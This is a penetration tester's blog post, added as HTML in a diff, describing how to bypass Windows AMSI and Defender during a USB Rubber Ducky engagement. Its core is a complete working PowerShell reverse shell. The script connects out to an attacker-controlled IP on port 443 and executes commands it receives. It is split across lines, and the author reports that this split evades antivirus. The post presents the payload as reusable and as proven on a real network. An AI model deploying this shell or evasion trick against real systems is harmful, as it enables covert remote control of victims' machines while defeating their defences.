@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Thinking Simpler to Bypass Antivirus | hackerob</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Thinking Simpler to Bypass Antivirus" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="On a previous engagement I sat in front of my computer banging my head, trying to come up with a simple reverse shell that I could be confident would get past my clients antivirus. My plan was to send a Rubber Ducky in the mail that when plugged into my victims computer would emulate a keyboard and inject a series of keystrokes taht would give me remote access to the computer. But I was stuck struggling trying to figure out a way to get past antivirus." />
+<meta property="og:description" content="On a previous engagement I sat in front of my computer banging my head, trying to come up with a simple reverse shell that I could be confident would get past my clients antivirus. My plan was to send a Rubber Ducky in the mail that when plugged into my victims computer would emulate a keyboard and inject a series of keystrokes taht would give me remote access to the computer. But I was stuck struggling trying to figure out a way to get past antivirus." />
+<link rel="canonical" href="/articles/thinking_simpler_to_bypass_antivirus.html" />
+<meta property="og:url" content="/articles/thinking_simpler_to_bypass_antivirus.html" />
+<meta property="og:site_name" content="hackerob" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-26T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Thinking Simpler to Bypass Antivirus" />
+<script type="application/ld+json">
+{"headline":"Thinking Simpler to Bypass Antivirus","dateModified":"2021-04-26T00:00:00-04:00","datePublished":"2021-04-26T00:00:00-04:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/articles/thinking_simpler_to_bypass_antivirus.html"},"url":"/articles/thinking_simpler_to_bypass_antivirus.html","description":"On a previous engagement I sat in front of my computer banging my head, trying to come up with a simple reverse shell that I could be confident would get past my clients antivirus. My plan was to send a Rubber Ducky in the mail that when plugged into my victims computer would emulate a keyboard and inject a series of keystrokes taht would give me remote access to the computer. But I was stuck struggling trying to figure out a way to get past antivirus.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css">
+  <link rel="shortcut icon" type="image/png" href="/favicon.png"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="hackerob" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">hackerob</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/articles/">articles</a><a class="page-link" href="/notes/">notes</a><a class="page-link" href="/tags/">tags</a><a class="page-link" href="/whoami">whoami</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Thinking Simpler to Bypass Antivirus</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-04-26T00:00:00-04:00" itemprop="datePublished">Apr 26, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>On a previous engagement I sat in front of my computer banging my head, trying to come up with a simple reverse shell that I could be confident would get past my clients antivirus. My plan was to send a Rubber Ducky in the mail that when plugged into my victims computer would emulate a keyboard and inject a series of keystrokes taht would give me remote access to the computer. But I was stuck struggling trying to figure out a way to get past antivirus.</p>
+
+<p>I had done a lot of googling and I had found tons of blogs written by smart people talking about creating custom C# code that would get past antivirus. One <a href="https://www.cybermongol.ca/operator-research/process-hollowing-evade-win-10-1909-security-and-implant-a-covenant-c2-grunt">blog</a> in particular I was reading was talking about using a technique called process hollowing and using tools like Donut and Covenant C2. Diligently following the steps given and trying to customize some portions of the code I still couldn’t get it past antivirus. The crazy thing was months earlier using this same technique I was able to bypass antivirus but apparently things had changed. All the blogs I had been reading had probably been read by the antivirus guys months earlier and some type of signatures had now been written.</p>
+
+<p>After days of struggling trying to customize the code more it was time to give up and go back to square one. Maybe it was true, antivirus had become too smart, after all it was using AI and Machine Learning. Don’t worry I know thats not true, but I had become disheartened. I had to remember that antivirus only blocks known malicious code, whether that be a malicious type of command or just a word in the code tagged as bad. Based on that knowledge my new idea was to create a reverse shell in PowerShell trying to write completely custom code.</p>
+
+<p>I created a simple reverse shell and then soon realized that it was almost identical to well known PowerShell reverse shell one liner. I can’t actually find the reverse shell I made several months ago but below is essentially the Powershell Reverse Shell one liner from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell">PayloadsAllTheThings</a> with some of my own tweaks mixed in.</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"192.168.233.129"</span><span class="p">,</span><span class="mi">443</span><span class="p">)</span><span class="w">
+</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">()</span><span class="w">
+</span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span><span class="w">
+</span><span class="kr">while</span><span class="w"> </span><span class="p">((</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$data</span><span class="p">)</span><span class="w">
+    </span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="p">{(</span><span class="n">iex</span><span class="w"> </span><span class="nv">$cmd</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="w"> </span><span class="p">)}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{(</span><span class="nv">$error</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="p">)}</span><span class="w"> </span><span class="kr">finally</span><span class="w"> </span><span class="p">{</span><span class="nv">$dir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">get-location</span><span class="p">)</span><span class="o">.</span><span class="nf">Path</span><span class="p">}</span><span class="w">
+    </span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$result</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"PS "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$dir</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&gt; "</span><span class="p">)</span><span class="w">
+    </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">)</span><span class="w">
+    </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span></code></pre></figure>
+
+<p>If you copy the one liner from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell">PayloadsAllTheThings</a> and paste it into PowerShell you get the old “This script contains malicious content…” error. This error means AMSI, the Antimalware Scan Interface, has recognized this code as malicious. So some kind of signature is catching it.</p>
+
+<p><img src="/assets/img/AV_Error.png" alt="AMSI Error" class="center-image" /></p>
+
+<p>But if you use my payload above which splits the one liner into several lines….</p>
+
+<p><img src="/assets/img/Shell.png" alt="Reverse Shell Success" class="center-image" /></p>
+
+<p>No errors, and we have a shell!!!</p>
+
+<p>So can we just put this payload into a simple PowerShell script and run it? Can it be that simple?</p>
+
+<p><img src="/assets/img/AV_Script_Bypass.png" alt="Reverse Shell Script Failure" class="center-image" /></p>
+
+<p>Yes, we can. It is really that simple.</p>
+
+<p>What is going on?</p>
+
+<p>I think this is because when you run each line seperatly, AMSI analyzes each line seperately. Each of these lines on their own aren’t recognized by AMSI as malicious. Even when all of the lines are in the same script AMSI still seems to be analyzing the contents of each line seperately.</p>
+
+<p>In case you are wondering, yes Windows Defender is turned on and I am running an up to date version of Windows.</p>
+
+<p><img src="/assets/img/Security_On.png" alt="Windows Security On" class="center-image" /></p>
+
+<p><img src="/assets/img/Windows_Current_Version.png" alt="Windows Version" class="center-image" /></p>
+
+<p>I was able to utilize this payload on the engagement and when someone plugged in the USB I had a reverse shell and more importantly a foothold on their network.</p>
+
+<p>The moral of the story is <code class="language-plaintext highlighter-rouge">sometimes you can just think simpler.</code></p>
+
+
+  </div><a class="u-url" href="/articles/thinking_simpler_to_bypass_antivirus.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">hackerob</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">hackerob</li><li><a class="u-email" href="mailto:pizza@hackerob.com">pizza@hackerob.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/hackerob"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">hackerob</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Blogs, notes, and code fragments of a curious hacker.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
